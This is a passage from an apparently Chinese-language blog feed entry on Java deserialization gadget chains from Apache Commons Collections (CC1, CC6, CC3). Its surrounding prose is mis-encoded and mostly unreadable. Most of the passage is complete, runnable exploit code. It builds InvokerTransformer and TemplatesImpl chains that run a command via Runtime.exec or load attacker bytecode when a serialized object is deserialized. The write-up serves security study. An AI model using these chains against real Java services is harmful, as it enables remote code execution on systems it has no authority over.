class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        Runtime r = Runtime.getRuntime();</span><br><span class="line">//        Class runtime = Runtime.class;</span><br><span class="line">//        Method getRuntimeMethod = runtime.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        Runtime a = (Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">//        Method execMethod = runtime.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">//        execMethod.invoke(a,&quot;calc&quot;);</span><br><span class="line">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">//        Runtime a= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(a);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Class c = Runtime.class;</span><br><span class="line">//        Method calcmethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        calcmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; Map = TransformedMap.decorate(hashMap, null, chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        Object o = constructor.newInstance(Retention.class, Map);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ•´ä½“æ€è·¯</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; ä»£ç æ‰§è¡Œ</span><br></pre></td></tr></table></figure></blockquote><p>ç”±äºRuntime.getRuntime.exec();æ— æ³•ååºåˆ—åŒ–ï¼Œå› æ­¤éœ€è¦åå°„</p><p><img src="https://img-blog.csdnimg.cn/01d9bc03454b42579f6cb65c16daeaf7.png#pic_center"><br>å…·ä½“æƒ…èŠ‚å¯ä»¥å‚è€ƒ</p><p><a href="https://su18.org/post/ysoserial-su18-2/#%E6%80%BB%E7%BB%93">cc1(1)</a></p><p><a href="https://blog.csdn.net/cjdgg/article/details/122277578">cc1(2)</a></p><p><a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">cc1(3)</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bf5252f16d46d7c835443b27896d7f4c">cc1(4)</a></p><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>æµç¨‹ï¼šï¼ˆä¸‹æ–¹é‚£ä¸ªï¼Œä¸Šæ–¹çš„ä¸ºcc1ï¼‰</p><p><img src="https://img-blog.csdnimg.cn/91153f76f8074e9d8c3f8df1829310de.png#pic_center" alt=" "></p><p>ä¼˜ç‚¹:ä¸å—javaç‰ˆæœ¬æ§åˆ¶ï¼Œä»»ä½•ç‰ˆæœ¬çš„javaéƒ½å¯ä»¥ä½¿ç”¨è¯¥é“¾å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry a = <span class="keyword">new</span> <span class="function">TiedM<span class="title">apEntry</span><span class="params">(lazyMap, <span class="string">&quot;aaa&quot;</span>)</span></span>;</span><br><span class="line">        HashMap&lt;Object, Object&gt; b = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        b.put(a, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¸ºäº†é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±è°ƒç”¨æ•´ä¸ªé“¾å­å› æ­¤å¯¹lazyMapè¿›è¡Œåå°„ï¼Œä»¤åˆšå¼€å¼€å§‹çš„å€¼ä¸ä¸ºchainedTransformerï¼Œä¹‹åé€šè¿‡åå°„åœ¨ä¿®æ”¹ä¸ºchainedTransformerï¼Œä»è€Œè¾¾åˆ°åœ¨åºåˆ—åŒ–æ—¶ä¸ä¼šåˆ©ç”¨æ•´ä¸ªé“¾å­</span></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryfield = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryfield.set(lazyMap,chainedTransformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//ä½¿å¾—åœ¨åºåˆ—åŒ–æ—¶putè°ƒç”¨æ—¶ç»™lazyMapæ·»åŠ çš„å€¼åˆ æ‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(b);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.yongsheng.site/2022/01/26/CommonsCollections-6/">å‚è€ƒ</a></p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>åˆ©ç”¨å¦ä¸€ç§æ–¹æ³•  ç±»çš„åŠ¨æ€åŠ è½½</p><p>åœ¨ç±»åŠ è½½æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ã€</p><p>Classloader-&gt;findClass-&gt;defineClass-&gt;Templateslmpï¼ˆè°ƒç”¨newinstanceç±»ï¼‰- &gt;getTransletInstance()</p><p>ç”±äºåœ¨Templateslmpç±»å†…éƒ¨æœ‰ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬é€ä¸ªåˆ†æï¼Œç„¶åå‘ç°ç¬¬ä¸‰ä¸ªå¯ä»¥è¾ƒå¥½åˆ©ç”¨</p><p><img src="https://img-blog.csdnimg.cn/9894ce67eb414e2f92b38cc9bd44a0c4.png#pic_center"></p><p>ç”±äºåœ¨ç¬¬ä¸‰ä¸ªä¸­å­˜åœ¨newinstance,å¯ä»¥åˆå§‹åŒ–</p><p><img src="https://img-blog.csdnimg.cn/c4cdce0d99fc43df9b2b67aae34412c2.png#pic_center"></p><p>å› æ­¤é€‰æ‹©è¿™ä¸ªæ¯”è¾ƒåˆé€‚</p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        Field tfactoryField = tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><p><img src="https://img-blog.csdnimg.cn/c378ae6bb59f4c29959bcba2f7464594.png#pic_center"></p><p>å¤§è‡´æ€è·¯ï¼š</p><p><img src="https://img-blog.csdnimg.cn/ffcd9d7bf6a449349a393b5cb860db84.png#pic_center"></p><p> è¿™ç§æ–¹æ³•å¯ä»¥ç”¨äºRuntimeè¢«è¿‡æ»¤æ—¶å€™ä½¿ç”¨</p><p>è¿˜æœ‰<strong>å¦ä¸€ç§æ–¹æ³•</strong>ï¼Œå½“æˆ‘ä»¬ä¸æƒ³ä½¿ç”¨InvokeTransformæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘åˆ©ç”¨ä¸‹é¢çš„è¿™ä¸ªé“¾å­</p><p><img src="https://img-blog.csdnimg.cn/80e78c15d2994c44889f76188740674c.png#pic_center"></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\text\\class\\text.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">//        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">//        tfactoryField.setAccessible(true);</span><br><span class="line">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line">//        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(templates),</span><br><span class="line">//                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">//        &#125;;</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(1);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line">//        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.yongsheng.site/2022/01/30/CommonsCollections-3/">å‚è€ƒ</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
